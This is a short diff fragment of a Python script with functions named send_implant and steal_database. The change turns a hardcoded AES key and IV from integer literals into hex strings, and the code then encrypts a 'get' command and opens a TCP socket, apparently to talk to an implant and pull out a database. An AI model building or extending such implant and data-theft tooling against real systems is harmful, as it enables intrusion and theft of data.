@@ -29,8 +29,8 @@ def send_implant(ip_address):
 
 def steal_database():
     print(len("sourdoughtoast12"))
-    key = str(0x546869732069732061206b6579313233)
-    iv = str(0x5468697320697320616e204956343536)
+    key = "546869732069732061206b6579313233"
+    iv = "5468697320697320616e204956343536"
     obj = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))
     ciphertext = obj.encrypt("get0000000000000")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
